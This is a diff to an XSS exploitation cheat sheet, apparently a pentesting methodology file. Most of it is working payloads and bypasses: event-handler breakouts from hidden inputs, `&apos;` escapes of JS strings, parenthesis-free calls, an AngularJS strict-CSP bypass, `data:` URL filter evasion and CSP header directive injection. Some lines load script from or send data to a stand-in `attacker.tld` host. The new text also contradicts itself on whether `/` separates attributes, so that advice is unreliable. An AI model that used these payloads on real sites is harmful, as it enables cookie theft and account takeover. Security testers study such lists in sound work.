@@ -37,7 +37,7 @@
 - Single-quoted: `'><svg onload=alert(1)>`, `' onmouseover=alert(1) x='`, `' autofocus onfocus=alert(1) x='` (when `<`/`>` are entity-encoded so tag breakout impossible but single quote is not escaped, inject an event attribute inside the value — no `>` needed; `autofocus onfocus` fires immediately on focusable elements like `<input>`/`<select>`/`<textarea>`).
 - **Unquoted attribute: quotes are literal, never break out.** Use whitespace or `>` to end value: ` onmouseover=alert(1) `, ` autofocus onfocus=alert(1)`, `><script>alert(1)</script>`. Entities decode into value, don't affect tokenizer.
 - Attribute name position (inside open tag): ` x onload=alert(1) ` — needs leading space; if glued to tag name, close tag first. Attribute names are lowercased, so case filters only.
-- Slash as separator when spaces filtered: `<svg/onload=alert(1)>`, `<script/src=//attacker.tld/x>`.
+- Slash as separator when spaces filtered: `<svg/onload=alert(1)>`, `<script/src=//attacker.tld/x>`. **But in tag attribute separation, `/` is NOT a valid whitespace separator — it gets parsed as part of the attribute name. Use `%0a`, `%09`, `%0c`, `&Tab;`, or `&NewLine;` instead.** 
 - Existing `on*` string value: `';alert(1)//`, `'-alert(1)-'`; if both quotes escaped, use `</script>` breakout or close tag.
 - Existing `<script src="…">`: set `src="//attacker.tld/x"` and serve JS.
 - `href`/`src`/`action`/`formaction`/`data`/`poster`/`xlink:href`: `javascript:alert(1)`, `javascript:alert(1)//`, `javascript&colon;alert(1)`; `<form action=javascript:alert(1)><input type=submit>`, `<button formaction=javascript:alert(1)>x`, `<base href=//attacker.tld/>` to hijack relative `<script src>`/`<a href>`. `iframe src=javascript:`/`object data=javascript:` are inconsistent across browsers — only report after confirmed execution.
@@ -46,6 +46,13 @@
 - `srcdoc`: `<iframe srcdoc="<script>parent.alert(1)</script>">` — literal `<` in quoted attr is legal; `&lt;script&gt;…` also works. Requires no sandbox without `allow-scripts`, inherits parent CSP.
 - `style="…"`: `javascript:` in `url()` dead in modern browsers; use CSS exfil or break out.
 
+#### Hidden/immutable input contexts
+- If the injection point is inside `<input type="hidden" value="...">`, events like `onmouseover`/`onfocus` will never fire because the element is hidden. **First inject `type="image"` (or `type="text"` + `autofocus onfocus`), then attach the event: `" type="image" src=x onerror=alert(1) x="`.** `type="image"` with broken `src` fires `onerror` automatically. This is often faster than trying to interact with hidden elements.
+- In `value="..." type="hidden"` reflections, if the quotes allow breakout but `type=hidden` kills events, always try to overwrite `type`.
+
+#### Event-handler JS string escapes
+- When the reflection lands inside an inline event handler's JS string (e.g. `onclick="track('REFLECTION')"`) and the server escapes single quotes with a backslash (`\'`) or double quotes with HTML entities, **remember that HTML entities in attribute values are decoded before JavaScript parsing.** Inject `&apos;` (or `&#39;`, `&#x27;`) to produce a raw single quote inside the JS string, bypassing the backslash escape. Template: `&apos;-alert(1)-&apos;` (or `&apos;+alert(1)+&apos;`). After HTML parsing the attribute becomes `track(''-alert(1)-'')`, which executes `alert(1)` as part of the expression. Works even when the server escapes both `'` and `\`, because the entity is not touched.
+
 ### Script context
 - JavaScript string single-quoted: `';alert(1)//`, `'-alert(1)-'`; double-quoted: `";alert(1)//`; backslash-escaped: `\';alert(1)//`.
 - Non-string: `1;alert(1)//`, bare `alert(1)`; template literal: `${alert(1)}`; regex: `/;alert(1)//`; line comment: prepend `%0a`.
@@ -53,6 +60,12 @@
   - One-pass `</script` stripping: preceding `<!--` puts tokenizer into script-data-escaped state; following `<script` into double-escaped state where `</script>` no longer closes — add extra `</script>`.
 - JSON.stringify output inside `<script>` — JSON doesn't escape `<`, `>`, `/`: `"</script><script>alert(1)</script>"`. `\u2028`/`\u2029` breakouts dead since ES2019.
 - `JSONP`: `/api?callback=alert(1)//` → `<script src="/api?callback=alert(1)//">`; also CSP whitelist bypass.
+- **When `(` and `)` are filtered but you are inside a JS string (e.g. `javascript:` URL or script block), don't force direct calls.** Try:
+  - Tagged template: `alert\`1\`` (fires alert with argument `1`). Also `setTimeout\`alert\`1\``.
+  - Assign to `onerror` and trigger it: `onerror=alert;throw 1` — `throw` executes and fires the global `onerror` handler.
+  - Use `toString`/`valueOf` implicit call hooks: `toString=alert,window+''` or `x={toString:alert},x+''`.
+  - Arrow-function + comma + throw chain (when `{}` and `=>` allowed): `x=x=>{throw/**/onerror=alert,1337}`.
+  - Always verify in console which characters survive and which JS features are available.
 
 ### Comments / raw text / foreign content
 - HTML comment: `--><img src=x onerror=alert(1)>`, `--!><script>alert(1)</script>`.
@@ -76,16 +89,21 @@
 - `localStorage`/`sessionStorage`/`history.state`/`document.cookie` read into sink.
 - `postMessage` without origin check: from console `win.postMessage('<img src=x onerror=alert(1)>','*')`.
 - AngularJS present (`ng-app`): `{{constructor.constructor('alert(1)')()}}` works on ≤1.5 as sandbox escape; 1.6+ removed sandbox — test `{{1+1}}` first. Vue `v-html` / React `dangerouslySetInnerHTML` sinks take raw HTML.
+- **AngularJS + strict CSP (no inline scripts, no `'unsafe-eval'`)**: Angular's own expression parser is not blocked by CSP; you can use Angular directives with expression to execute arbitrary JS. Try injecting an element with a directive that triggers automatically:
+  - `<input id=x ng-focus=$event.composedPath()|orderBy:'(y=alert)(document.cookie)'>` and then navigate with `#x` to autofocus the input. The `orderBy` filter evaluates the supplied expression string, achieving code execution without `eval`.
+  - Other directives: `ng-init`, `ng-click` (needs click), `ng-mouseenter`; combine with URL fragment for automatic focus.
+  - Always test `{{1+1}}` first; if Angular is active, expression injection beats HTML tags.
 - Head reflections: `<title></title><script>alert(1)</script>`, `</title><img src=x onerror=alert(1)>`, `"><script>…` inside `<meta content="…">`.
 
 ## Filter & WAF bypass
 - `<script>` blocked → event-driven tags, `<svg/onload=alert(1)>`, `<a href=javascript:alert(1)>`, `srcdoc`.
 - `on\w+=` blocked → `<svg><script>alert(1)</script>`, `javascript:` URL attributes, `srcdoc`. When `on*` and `<script` are both string-substituted/filtered but `<` and `>` pass through unchanged, use a `data:` URL to embed a full script without `<script>` in the raw payload: `<iframe src="data:text/html,%3Cscript%3Ealert(1)%3C/script%3E">`, `<object data="data:text/html,%3Cscript%3Ealert(1)%3C/script%3E">`, `<embed src="data:text/html,%3Cscript%3Ealert(1)%3C/script%3E">`. URL-encode `<script>`/`</script>` as `%3Cscript%3E`/`%3C/script%3E` to dodge keyword filters; the browser decodes inside the iframe/object and executes. `<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">` also works when the reflected value is an HTML attribute.
+- **When `on` is globally replaced (e.g. `on`→`o_n`) and `<script` is replaced (e.g. `<script`→`<scr_ipt`) but `<`/`>` remain: avoid all event handlers and script tags entirely. Use `<iframe src="data:text/html,%3Cscript%3Ealert(1)%3C/script%3E">` or `<object data="data:text/html,%3Cscript%3Ealert(1)%3C/script%3E">`. The `data:` URL payload does not contain the literal characters `on` or `<script`, so the filter leaves it unmodified.** Same approach applies when only `on` is filtered but `script` is not, but `script` tag is blocked by other means.
 - Quotes blocked → unquoted attribute `<img src=x onerror=alert(1)>`, ` onmouseover=alert(1) `.
 - Parentheses blocked → entities in handler values are decoded: `<svg onload=alert&#40;1&#41;>`; named entities `&lpar;`/`&rpar;`; tagged template ``onload=alert`1` ``; `<svg onload=alert;throw 1>`.
 - `<` and `>` blocked → stay in JS/URL context: `alert(1)`, `javascript:alert(1)`, or `%3c`/`%253c`/`&#x3c;` if decode pass after filtering.
 - `>` only blocked → omit it: `<img src=x onerror=alert(1)` (EOF closes tag).
-- Spaces blocked → `/`, tab, `%0a`, `%0c`, `/**/`, `&Tab;`, `&NewLine;`.
+- Spaces blocked → **never use `/` as attribute separator; it is not parsed as whitespace in HTML.** Use tab, `%0a`, `%0c`, `/**/`, `&Tab;`, `&NewLine;`. Example: `<img%0asrc=x%0aonerror=alert(1)>`. If the server replaces spaces with `&nbsp;`, that entity decodes to a non-breaking space `\u00a0`, which does NOT separate HTML attributes — switch to newline/tab.
 - `javascript:` blocked → `JaVaScRiPt:`, `java\tscript:`, `jav&#x0a;ascript:`, `jav&#x61;script:`, `&#106;avascript:`, `javascript&colon;alert(1)`, `//attacker.tld`. If the backend lowercases before matching keywords, case mixing is useless; instead HTML-encode key letters: decimal `&#115;` = s, hex `&#x73;` = s, un-semicoloned `&#115` also works — `java&#115;cript:alert(1)`, `jav&#x61;script:alert(1)`, `&#106;avascript:alert(1)`. The browser decodes numeric entities in attribute values before the scheme is interpreted. If the app additionally requires the value to contain `http://` for link validation, append `//http://` as a JS comment after the payload.
 - `alert` blocked → `prompt(1)`, `confirm(1)`, `print()`, `(alert)(1)`, `top['al'+'ert'](1)`, `\u0061lert(1)`, `[].constructor.constructor('alert(1)')()`, `globalThis['al\u0065rt'](1)`.
 - Keyword blocklist on `script` → `<ScRiPt>`, `<scr<script>ipt>`, `<script x>`, `script\nsrc=`, `<script/src=//x>`.
@@ -103,7 +121,7 @@
 - `strip_tags` → keeps attributes of allowed tags; inject into allowed tag's attribute or stray `<`.
 - Case-sensitive `str_replace` → `<ScRiPt>`, `OnErRoR=`.
 - Decode order: filter after decoding → `&#x3c;` blocked; filter before browser decode → `&#x3c;script&#x3e;` lands live.
-- **Entities never decode inside `<script>`** — `&quot;`/`&lt;` stay literal. They decode in text nodes and attribute values → `&#x3c;` is real `<`, `&colon;` is `:`.
+- **Entities never decode inside `<script>`** — `&quot;`/`&lt;` stay literal. They decode in text nodes and attribute values → `&#x3c;` is real `<`, `&colon;` is `:`. In event-handler attributes, entity decoding happens before the JavaScript engine parses the handler code, so `&apos;` becomes `'` and bypasses JS-string escaping.
 - Server output + reachable DOM sink = double-decode XSS: single-encoded reflection + `innerHTML`/`eval`/`$.html()`.
 - Sanitizer output re-parsed by client is mXSS fingerprint — look for cached sanitized HTML that gets re-serialized.
 - DOMPurify/Trusted Types: check version, `ADD_ATTR`/`ALLOW_UNKNOWN_PROTOCOLS`/`ALLOWED_URI_REGEXP`, and whether `require-trusted-types-for 'script'` enforced. TT kills most HTML sinks unless policy exposes `createHTML` passthrough.
@@ -120,6 +138,7 @@
 - `base-uri` unset → base hijack. `form-action` unset → `javascript:` in form action. `object-src` unset → `<object>`/`<embed>`.
 - `require-trusted-types-for 'script'` → HTML sinks die unless policy passthrough.
 - Report-Only CSP → payloads still run.
+- **If CSP blocks all script execution but you have HTML injection inside a `<form>`**: don't chase JS execution. Inject a submit button (`"><button type="submit">Click</button>`) or change form behavior (`type="submit"` on an existing input). Form hijacking can exfiltrate data or trigger CSRF without JavaScript. Only works if the reflection lands inside a form and user interaction is plausible.
 
 ## Cases that change payload
 - **Header reflection** executes in whatever later renders that header — effectively stored: canary first, then `//attacker.tld/?x`. Only report if victim request can carry value: `User-Agent`/`Referer`/`Origin` via link/form/redirect; `X-Forwarded-Host`/`Host` via proxy/cache.
@@ -138,6 +157,7 @@
 - **Reflection into attribute read later by JS** (`data-*`, `value`, `title`) → second-order into client-side sink; trace reader.
 - **Multiple attribute sinks with no tag breakout** — if the same input reflects into `<input value="...">`, `<a href="...">`, etc., and all are double-quoted with `<`/`>` entity-encoded, don't keep hunting for `>`; the `href`/`src`/`action` attribute itself is the sink. Inject `javascript:alert(1)` and require a click. Bypass backend `strtolower`+keyword substitution with HTML entities for key letters, and satisfy `http://` validation with `//http://` as a trailing JS comment.
 - **`window.name` source** — attacker sets `window.name = '<img src=x onerror=alert(1)>'` then navigates; check if victim reads into sink.
+- **Reflection into CSP response headers** (e.g. `report-uri /csp-report?token=`, `report-to`, `policy-uri`, `nonce`): try injecting a semicolon to add a new directive, e.g. `;script-src-elem 'unsafe-inline'` or `;script-src 'unsafe-inline'`. CSP directives are separated by `;`, so an unfiltered token inside a directive can override the whole policy. After injecting the policy change, your original script/event payload (using another reflection) will execute. Check whether the server URL-decodes or reflects the parameter into the CSP header without sanitizing `;` and whitespace. This is often easier than CRLF header injection.
 
 ## Verification and false positives
 - Prove origin with `alert(document.domain)`; `alert(1)` fine for PoC. Never exfiltrate real user cookies.
